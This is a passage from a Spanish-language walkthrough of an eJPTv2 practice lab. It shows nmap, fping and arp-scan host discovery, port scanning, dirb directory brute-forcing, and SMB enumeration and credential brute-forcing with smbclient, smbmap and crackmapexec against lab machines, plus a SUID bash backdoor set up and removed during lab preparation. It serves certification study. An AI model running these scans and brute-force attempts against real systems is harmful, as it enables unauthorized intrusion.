+                     data-src="/2025/03/25/lab-ejptv2-xerosec/symfonos1_ssh_acceso_solo_con_llave.png"
+                      alt="Solo permite el acces con llave"
+                ><figcaption>Solo permite el acces con llave</figcaption></figure></p>
+<p>Podéis comprobar que funciona accediendo con ella.<br>La pegais en un archivo(id_rsa por ejemplo).</p>
+<p>Le dais los permisos</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br></pre></td></tr></table></figure></div>
+
+<p>Accedeis:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa helios@10.0.2.6</span><br></pre></td></tr></table></figure></div>
+
+<p>La contraseña ya la sabéis, 123123.</p>
+<p>A continuación para dejar el laboratorio como estaba:</p>
+<ul>
+<li>Borrar el privilegio SUID de la bash<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p <span class="comment"># entras como root</span></span><br><span class="line"><span class="built_in">chmod</span> u-s /bin/bash</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></div></li>
+<li>Borrar el archivo curl creado</li>
+<li>El archivo id_rsa de nuestra máquina atacante<br>El path no hace falta modificarlo porque solo se actualiza para la sesión actual.</li>
+</ul>
+<h3 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h3><p>Simple. La máquina esta “rota” porque la idea es que con los usuarios con los que se va a hacer el compromiso de la máquina tienen aplicada una política de contraseñas que caduca cada x tiempo y la contraseña esta caducada por defecto. Necesitas renovar las credenciales(utilizar Writeups para mirarlo)</p>
+<p>Tenemos que abrir la máquina Windows Server, desbloquearla(en mi caso utilice Entrada &gt; Teclado &gt; Insertar Ctrl + Alt + Del</p>
+<p>Pulse varias veces escape para poder seleccionar un usuario y puse la contraseña y comentaba que estaba caducada y volví a poner la misma, lo mismo para el usuario bogo:</p>
+<p>marcos:SuperPassword<br>bogo:bogo</p>
+<h1 id="Empezamos-el-laboratorio"><a href="#Empezamos-el-laboratorio" class="headerlink" title="Empezamos el laboratorio"></a>Empezamos el laboratorio</h1><p>Ahora empezamos la magia, ya hemos preparado todo. Si os queréis quitar de problemas podéis lanzar todas las máquinas y punto, si vuestro equipo físico no tiene esa capacidad, os iré diciendo igualmente las máquinas a usar para que las vayáis desplegando sobre la marcha.</p>
+<h1 id="Creacion-del-entorno-de-trabajo"><a href="#Creacion-del-entorno-de-trabajo" class="headerlink" title="Creación del entorno de trabajo"></a>Creación del entorno de trabajo</h1><p>El examen se realizará con usuario root desde un principio, así que, si queréis ser realistas, convertiros en super usuario y dirigiros al directorio root.</p>
+<p>A la vez que realizamos el laboratorio, lo recomendable es crearme un vault en Obsidian para coger notas, la idea es crear un canvas con diferentes notas e interconectarlas.</p>
+<h1 id="Descubrimiento-de-hosts"><a href="#Descubrimiento-de-hosts" class="headerlink" title="Descubrimiento de hosts"></a>Descubrimiento de hosts</h1><p>Aquí sí que os recomiendo que lanceis todas para poder ver todas las máquinas de un vistazo. Si no, solo veréis algunas lanzadas. La primera máquina va a ser Symfonos 1.</p>
+<p>Recordar también que esto es un CTF(Capture The Flag) en la certificación eJPTv2 habrá preguntas del siguiente estilo: Cuantos equipos hay en esta red, que puertos abiertos tiene la máquina X?. La fase de reconocimiento es <strong>muy importante</strong> ya que muchas preguntas van sobre esta.</p>
+<p>Bien, para ver que dispositivos tenemos en nuestra red tenemos varias formas de hacerlo:</p>
+<p>Usando nmap:</p>
+<p>Ping scan con nmap, si estamos conectados con ethernet(normalmente interfaz eth0), nmap utiliza el protocolo <strong>arp</strong> por defecto porque es más efectivo, no utiliza ping, en caso de estar por conexión Wi-Fi si realiza el ping. Igualmente podemos forzar a que realice este “ping” mezclado con arp.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn --send-ip 10.0.2.0/24 -oN ping_scan_nmap</span><br></pre></td></tr></table></figure></div>
+
+<p>Para hacer un escaneo de ping también podéis utilizar la herramienta <strong>fping</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -a -g 10.0.2.0/24 2&gt;/dev/null &gt; fping_hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>La parte mala de hacer un escaneo de ping es que los equipos Windows tienen un firewall por defecto y este suele bloquear todas las peticiones ping… PuÑetA.</p>
+<p>Lo más fácil para eso es tirar un escaneo utilizando el <strong>protocolo arp</strong> que funciona muy bien. Para ello lo podemos hacer de las diferentes formas:</p>
+<p>En caso de estar cona una interfaz ethernet:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 10.0.2.0/24 -oN ping_scan_arp_nmap</span><br></pre></td></tr></table></figure></div>
+
+<p>Podéis utilizar la herramienta arp-scan:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -I eth0 --localnet &gt; arp_scan</span><br></pre></td></tr></table></figure></div>
+
+<p>También tenéis netdiscover:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 10.0.2.0/24</span><br><span class="line"><span class="comment"># Os recomiendo que copiéis y peguéis el output en un archivo para dejar evidencia(Ctrl+C y copiáis).</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>El siguiente escaneo no aplica mucho a esta certificación pero considero que esta bien saberlo. En ciertas ocasiones no podemos utilizar el protocolo arp y ya sabemos lo que pasa con ICMP… </p>
+<p>Pues nmap nos ofrece el TCP Syn Scan que nos permite setear la flag SYN del paquete TCP y así realizar el three-way handshake sin completar la conexión como hariamos con un escaneo Stelth Scan de nmap(-sS) para los puertos. También a eso le podemos indicar que pruebe la conexión con UDP a puertos comunes:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v --open -sn -PS21,22,80,443,445,3389 -PU53,137,138,139 10.0.2.0/24 --send-ip</span><br></pre></td></tr></table></figure></div>
+
+<p>Este escaneo pregunta por los diferentes puertos y si el puerto esta abierto contesta con un <strong>SYN, ACK</strong>, en cambio, si el puerto está cerrado responde con un <strong>RST, ACK</strong>, esto se puede comprobar mejor si abris Wireshark. Pero en este caso es detectado igual ya que aunque no tenga el puerto abierto se dan señales de vida y se considera que el equipo está activo. Pero esta es una forma de bypasear esa protección ante ICMP de los firewalls</p>
+<p>En este ejemplo que ponemos tantos puertos puede tardar un poco, pero en ciertas ocasiones puedo ser muy útil </p>
+<ul>
+<li><p><strong>PS</strong>: Escaneo Stealth(-sS) para hosts. Si tiene cualquiera de los puertos indicados abiertos saldrá el equipo.</p>
+</li>
+<li><p><strong>PU</strong>: Realizamos lo mismo pero para UDP, si, en el mismo comando :o, en este caso escanemos puertos como el de dns(53), 137,138,139(net-bios de Windows)</p>
+</li>
+<li><p><strong>–send-ip</strong>: Prohibe el uso de arp y obliga a nmap a usar paquetes IP(ICMP, TCP SYN, UDP) para descubrir hosts.</p>
+</li>
+</ul>
+<p>Siempre siempre siempre os recomiendo guardaros los diferentes escaneos y después mirar los diferentes archivos por si encontráis una IP que no estaba en el resto.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/external_network_hosts_nmap.png"
+                      alt="Hosts disponibles."
+                ><figcaption>Hosts disponibles.</figcaption></figure></p>
+<p>Los hosts 1,2, y 3 son generados por virtualbox a esos no les hacemos caso.</p>
+<h1 id="Escaneamos-puertos"><a href="#Escaneamos-puertos" class="headerlink" title="Escaneamos puertos"></a>Escaneamos puertos</h1><p>En el examen tendremos muchas máquinas que no nos servirán para nada, son solo para “molestar”, tenemos que saber cuáles son nuestros objetivos.</p>
+<p>A continuación nos creamos(o nos movemos si ya lo tenemos) un directorio para escaneo de puertos</p>
+<p>Podemos realizar un primer escaneo general de las IPs encontradas haber que tienen:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -F -T4 --open -Pn -n -v 10.0.2.5,6,8-10</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-F</strong>: Los 100 puertos más comunes.</li>
+<li><strong>10.0.2.5,6,8-10</strong>: Queremos escanear la ip 10.0.2.5, 10.0.2.6, 10.0.2.8, 10.0.2.9, 10.0.2.10</li>
+<li><strong>T4</strong>: Nos da igual ser “sigilosos” ya que es un laboratorio sin ningún medio que nos pueda detectar como IPS&#x2F;IDS…</li>
+</ul>
+<p>Una vez ya visto por empieza a que nos estamos enfrentando vamos a realizar un ecaneo más profundo para identificar todos los puertos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- -T4 --open -Pn -n -v 10.0.2.5,6,8-10 -oA stealth_scan</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-oA</strong>: Queremos que nos guarde el escaneo en los tres principales formatos de guardado, XML(.xml), NMAP(.nmap) y grepeable(.gnmap)</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/port_scan_nmap.png"
+                      alt="Escaneo de puertos."
+                ><figcaption>Escaneo de puertos.</figcaption></figure></p>
+<h1 id="Escaneo-de-servicios-y-sus-versiones"><a href="#Escaneo-de-servicios-y-sus-versiones" class="headerlink" title="Escaneo de servicios y sus versiones"></a>Escaneo de servicios y sus versiones</h1><p>Para obtener más información sobre estos servicios y versiones(ya que en este caso nos interesan todos) debemos crear una expresión regular para obtener los puertos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;^[0-9]&#x27;</span> stealth_scan.nmap | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">sort</span> -u -n | xargs | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;, &#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>grep ‘^[0-9]’</strong>: Queremos obtener las líneas que empiezan por un número(entre el 0 y el 9)</li>
+<li><strong>awk -F ‘&#x2F;‘ ‘{print $1}’</strong>: Con la herramienta awk para el procesado de texto podemos indicar que nuestro delimitador va a ser ‘&#x2F;‘ y que solo queremos mostrar el primer argumento(o sea el texto que este antes de encontrarse la primera ‘&#x2F;‘). También como alternativa puedes usar el comando: <code>cut -d &#39;/&#39; -f1</code>.</li>
+<li><strong>sort -u -n</strong>: El texto que queda, en este caso los puertos muchos son repetidos, bien, para evitar esto utilizamos el parámetro <strong>-u</strong> de unique y después si queremos ordenarlo numéricamente utilizamos <code>-n</code>.</li>
+<li><strong>xargs</strong>: Xargs convierte la salida de un comando en el parámetro del siguiente. Por defecto si no se indica nada, xargs convierte los saltos de línea en espacios.</li>
+<li><strong>tr ‘ ‘, ‘,’</strong>: tr se encarga de reemplezar un solo carácter, en este caso nso interesa que en lugar de espacios existan ‘,’ para pasárselo posteriormente a nmap.</li>
+</ul>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/regex_ports_nmap.png"
+                      alt="Regex para los puertos obtenidos en nmap."
+                ><figcaption>Regex para los puertos obtenidos en nmap.</figcaption></figure></p>
+<p>Acordar siempre de tener todo apuntado o realizar capturas, en mi caso lo he metido a un archivo.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,25,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49670 -Pn --open -sCV 10.0.2.5,6,8-10 -oN service_and_version</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/service_and_version_nmap.png"
+                      alt="Versiones y servicios de los hosts encontrados."
+                ><figcaption>Versiones y servicios de los hosts encontrados.</figcaption></figure></p>
+<p>Vamos a ir mapeando nuestras notas en Obsidan, recordar ir haciéndolo a la vez para no dejaros nada atrás. En este caso cabe recalcar que encontramos los nombres de Simple, Symfonos y Experience</p>
+<h1 id="🎯-Symfonos"><a href="#🎯-Symfonos" class="headerlink" title="🎯 Symfonos"></a>🎯 Symfonos</h1><p>Resumen de lo que vamos a hacer(atención spoiler):</p>
+<p>En esta máquina vamos a ver fuerza bruta de directorios web con dirb y dirbuster, enumeración de de smbmap con smbclient, smbmap, crackmapexec, escaneo de Wordpress con WPScan y searchesploit para realizar obtener un LFI. Del LFI obtenemos una id_rsa encriptada que crackearemos con john y una vez dentro realizas un PATH Hijacking para aprovechar un binario SUID.</p>
+<h2 id="Enumeracion"><a href="#Enumeracion" class="headerlink" title="Enumeración"></a>Enumeración</h2><p>Vamos a empezar con la máquina Symfonos, en mi caso tiene la IP, 10.0.2.6 y ya que tenemos todo el escaneo resuelto, vamos a analizar lo reportado.</p>
+<p>Para ello vamos a crear un directorio targets y dentro un directorio con el nombre 10.0.2.6 para mantener todo más organizado.</p>
+<h3 id="Ssh"><a href="#Ssh" class="headerlink" title="Ssh"></a>Ssh</h3><p>Lo primero que podemos apreciar es que el servicio ssh está disponible en el puerto 22 y nos indica su versión <code>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</code>. Podríamos encontrar con launchpad el tipo de sistema operativo, pero no tenemos conexión a internet en el laboratorio. Todas las versiones inferiores a <strong>7.7</strong> de ssh son vulnerables a <strong>user enumeration</strong>. Esto es una forma válida de identificar usuarios en el servidor ssh.<br>Para ello utilizariamos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ssh user enum</span><br><span class="line"><span class="comment"># Creo que el que funciona correctamente es este, pero si no probar con el resto</span></span><br><span class="line">OpenSSH &lt; 7.7 - User Enumeration (2)                                          | linux/remote/45939.py</span><br></pre></td></tr></table></figure></div>
+
+<p>Pero no lo vamos a utilizar porque no es el vector principal de entrada de esta máquina, recordar también que no tenéis conexión a internet, si os falta cualquier dependencia tanto de python 2.7 o 3 no podéis descargáosla.</p>
+<p>Así que seguimos mirando, tenemos smtp que es para correo, no nos interesa de momento, el puerto 80(servidor web), podemos ver las tecnologías desde línea de comandos con <strong>whatweb</strong>, 139 y 445 que nos indica que el servicio smb&#x2F;samba esta abierto(servicio utilizado para compartir recursos en la red).</p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Primero vamos a ver que tiene el servicio web, podemos utilizar whatweb:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://10.0.2.6</span><br></pre></td></tr></table></figure></div>
+
+<p>En este caso nos aparece que es un apache 2.4.25, Debian Linux, ya más o menos hemos sacado el sistema operativo sin tener que utilizar la opción <code>-O</code> de nmap para identificarlo.</p>
+<p>Podemos acceder desde un navegador para ver que pinta tiene:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/first_view_symfonos_browser.png"
+                      alt="Servicio web de symfonos."
+                ><figcaption>Servicio web de symfonos.</figcaption></figure></p>
+<p>Al ver la imagen lo primero que se nos puede occurir es realizar algo de <strong>estenografía</strong> para ver si la imagen contiene algo secreto, como ver si los metadatos de la imagen contienen algo con <strong>exiftool</strong>, si los bits menos significativos de la imagen ocultan algo, con exiftool también. Aunque no va por aquí.</p>
+<p>Podemos inspeccionar el código fuente de la página, abrir la consola y ver si al inspeccionar o en la consola aparece algo(no es la ocasión).</p>
+<p>Ver si existe un archivo robots.txt o sitemap(s).xml, que tampoco es el caso(nmap nos hubiera chivado algo).</p>
+<p>Pues que podemos hacer más?<br>Podemos realizar un ataque de fuerza bruta con <strong>dirb</strong>(ya que la recomienda el INE) para comprobar si encontramos algún directorio o fichero oculto.</p>
+<p>Dirb es por línea de comandos, pero también tiene su modo gráfico, dirbuster.</p>
+<p>Por línea de comandos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.0.2.6/</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>-X .php,.html</strong>: Si alguna vez os hace falta podéis indicar que utilice dichas extensiones. Cada palabra del diccionario les añade estas.</li>
+<li><strong>-o output.txt</strong>: Guardar el resultado.</li>
+<li><strong>-N 302</strong>: Ignorar códigos de estado. En este caso el 302(redirects)<br> <strong>-w</strong>: Algunas veces salen avisos y estos paran la ejecucción del programa. Si queremos omitirlos y seguir para alante utilizamos esta opción.</li>
+<li><strong>-z 100</strong>. Speed delay. No tenemos threads pero podemos controlar los milisegundos para que vaya más lento, tener cuidado que puede saltarse directorios o archivos y dar falsos positivos.</li>
+<li><strong>-r</strong>: No recursivo. No queremos que si encuentra un directorio siga enumerando su contenido.</li>
+<li><strong>-v</strong>: Nos muestra las páginas que no existen(404)</li>
+<li><strong>-t</strong>: Por defecto se añade una “slash” al final y en ocasiones para descubrir directorios puede venir bien(otras no), pero para descubir archivos por ejemplo no.</li>
+</ul>
+<p>Si utilizamos dirb <strong>NO RECOMIENDO DICCIONARIOS GRANDES</strong> como “directory-list-2.3-medium.txt” o parecidos, recomiendo los que estan en el directorio &#x2F;usr&#x2F;share&#x2F;owrdlists&#x2F;dirb&#x2F; ya que esta herramienta de consola tarda mucho en cargar el diccionario, pero si esperas a que cargue funciona correctamente. Utilizarlo con ‘-w’ para cuando salte un warning poder seguir y que no os pare el programa.</p>
+<p>Ayuda de la documentación de <a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/" >hackingarticles.in<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>Podéis utilizar dirbuster que es mediante interfaz gráfica, no tarda en cargar los diccionarios:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/dirbuster_configuration_symfonos.png"
+                      alt="Configuración de dirbuster."
+                ><figcaption>Configuración de dirbuster.</figcaption></figure></p>
+<p>En este caso prefiero por interfaz gráfica ya que por consola(dirb) tarda más en cargar el diccionario. Aunque no es recomendada por el INE y tengo sospechas que la nota no solo se basa en las repuestas introducidas, si no de introducir los “comandos adecuados”, por eso mejor ceñirte(dentro de lo que cabe) a las herramientas indicadas.</p>
+<p>Total, después de todo esto no encontramos nada. Ya que el manual es el creado por apache y no nos sirve para nada.</p>
+<p>Así que pasamos al siguiente servicio.</p>
+<h3 id="SMB-Samba"><a href="#SMB-Samba" class="headerlink" title="SMB&#x2F;Samba"></a>SMB&#x2F;Samba</h3><p>Vamos a intentar listar recursos compartidos mediante el uso de una null session(acceso sin credenciales), para ello vamos a utilizar la herramienta smbclient.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.0.2.6 -N</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/smbclient_null_session_symfonos.png"
+                      alt="Recursos compartidos."
+                ><figcaption>Recursos compartidos.</figcaption></figure></p>
+<p>Pero la desventaja de smbclient es que no nos muestra los <strong>permisos de los recursos compartidos</strong>. No sabemos a primera vista a que recurso tenemos acceso mediante esta null session, tendríamos que ir probando uno a uno.</p>
+<p>Para ello podemos utilizar el comando <strong>smbmap</strong>. Al utilizarlo me ponía que estableciendo una conexión con el host, pero no la terminaba de establecer y lo cerraba. Para ello he realizado un git clone del repositorio de <a class="link"   target="_blank" rel="noopener" href="https://github.com/ShawnDEvans/smbmap" >smbmap<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> y he utilizado la herramienta en lugar de la que venía por defecto en Kali Linux y si funciona. Esto no se podría realizar en el examen porque no tendríamos conexión a internet, pero así veis como funciona:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.0.2.6</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/smbmap_null_session_symfonos.png"
+                      alt="Resultado de smbmap."
+                ><figcaption>Resultado de smbmap.</figcaption></figure></p>
+<p>Tenéis otra alternativa como crackmapexec o netexec ya que crackmapexec ha dejado de tener soporte y esta última sí. Aunque en el examen aparezca como crackmapexec:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.6 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_null_session_symfonos.png"
+                      alt="Resultados de crackmapexec."
+                ><figcaption>Resultados de crackmapexec.</figcaption></figure></p>
+<p>Y por último, la herramienta que nos va a dar más información va a ser <strong>enum4linux</strong>. Esto recopila un montón de información “abusando” del protocolo SMB. Claro, hace más ruido que el resto, aunque esto para el eJPT no nos preocupa.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.0.2.6</span><br></pre></td></tr></table></figure></div>
+
+<p>Pero bueno, a parte de tooda la información que nos ha sacado, este sería el formato de los recursos compartidos de una null session:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/enum4linux_symfonos.png"
+                      alt="Recursos compartidos con enum4linux."
+                ><figcaption>Recursos compartidos con enum4linux.</figcaption></figure></p>
+<p>Bien, pues una vez vistas las diferentes herramientas vamos a inspeccionar el recurso anonymous. Una combinación bastante buena es usar smbclient con smbmap y&#x2F;o crackmapexec.</p>
+<p>En este caso vamos a utilizar smbclient para utilizar una sesión interactiva dentro de dicho recurso:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\10.0.2.6/anonymous -N</span><br></pre></td></tr></table></figure></div>
+
+<p>O también podéis introducir un usuario y contraseña cualquiera, debería dejar entrar igual.</p>
+<p>Una vez dentro podemos utilizar diferentes comandos, ls, cd, get(para traer archivos), mget *(traer todos los archivos de un directorio).</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/get_and_show_attention_file_smb_symfonos.png"
+                      alt="Resultado de attention.txt"
+                ><figcaption>Resultado de attention.txt</figcaption></figure></p>
+<p>Uuh, tenemos un usuario y tres posibles contraseñas. Vamos a crearnos dos archivos, users.txt y passwords.txt donde vamos a poner en cada uno la información que tenemos. En usuarios ponemos en minúsculas a zeus y helios(visto con enum4linux y al listar recursos compartidos) y en contraseñas las encontradas.</p>
+<p>Los guardamos una línea debajo de otra(como los diccionarios de contraseñas).</p>
+<p>Si queréis enumerar usuarios también podéis con crackmapexec y a mi parecer, más fiable que enum4linux:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.6 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_smb_enumeracion_usuarios_symfonos.png"
+                      alt="Enumeración de usuarios con crackmapexec."
+                ><figcaption>Enumeración de usuarios con crackmapexec.</figcaption></figure></p>
+<p>Mmmm, en este caso nos aparece solo helios, no dice nada de zeus, vamos a poner a helios primero en nuestra lista para que en caso que encuentre el usuario y la contraseña válida pare antes.</p>
+<p>¿Que pare el que?<br>Bien, vamos a realizar un ataque de fuerza bruta con crackmapexec para intentar validar el usuario con su contraseña correspondiente, para ello realizamos lo siguiente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.6 -u user.txt -p passwords.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/crackmapexec_smb_validar_credenciales_falso_positivo_zeus_symfonos.png"
+                      alt="Validación de usuarios con crackmapexec."
+                ><figcaption>Validación de usuarios con crackmapexec.</figcaption></figure></p>
+<p>Uuh, parece que hemos encontrado la contraseña de zeus, o sea que este usuario si existe.</p>
+<p>Pues bien, recordermos que crackmapexec es una herramienta que ya no tiene soporte y aunque lo tenga todas las herramientas pueden generar <strong>falsos positivos</strong>(información erronea).</p>
+<p>Así que vamos a comprobarlo con otra herramienta como smbmap o smbclient.</p>
+<p>Ooh, con smbmap no me aparece nada, que raro:&#x2F;. Vamos a probar con smbclient. Pero claro, no se que a recursos mirar, vamos a probar con helios.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/zeus_smb_failed_attempts_symfonos.png"
+                      alt="Intentos fallidos de acceso con zeus."
+                ><figcaption>Intentos fallidos de acceso con zeus.</figcaption></figure></p>
+<p>Bueno, parece que con el usuario “zeus” no tenemos acceso a nada. ¿Entonces?. Y si es la herramienta crackmapexec la que esta fallando?. Recuerda siempre probar a realizar lo mismo con <strong>diferentes herramientas</strong> ya que todas las herramientas pueden ser susceptibles a fallar.</p>
+<p>Vamos a probar con otra herramienta, smbmap:<br>En este caso smbmap no permite pasarle un diccionario por defecto así que como son pocas contraseñas vamos a ir probándolas manualmente:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./smbmap.py -H 10.0.2.6 -u helios -p epidioko</span><br></pre></td></tr></table></figure></div>
+
+<p>epidioko no nos deja, en cambio, si utilizamos qwerty si aparece información extra:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/25/lab-ejptv2-xerosec/smbmap_helios_valid_credentials_symfonos.png"
+                      alt="Permisos accesibles por helios."
+                ><figcaption>Permisos accesibles por helios.</figcaption></figure></p>
+<p>Uopa, aquí podemos ver que los permisos han cambiado, ya no tenemos solo acceso a anonymous, si no que que también podemos acceder a los recursos print$ y helios. Esto nos deja claro que no siempre podemos confiar en una sola herramienta, incluso en que sea una “importante”.</p>
+<p>Así que vamos a intentar acceder como el usuario helios y contraseña qwerty al recurso compartido helios.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.0.2.6/helios -U <span class="string">&#x27;helios&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>La contraseña la introducimos a continuación y podemos ver nuevos recursos, research.txt y todo.txt. Como mencionamos anteriormente nos podemos traer diferentes archivos con <code>mget *</code>.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prompt</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure></div>
+
+<p>Con prompt nos olvidamos de la confirmación que nos pregunta si queremos traer x archivo y lo mismo con el siguiente y así. Sin esta confirmación todos los archivos serán descargados de golpe.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
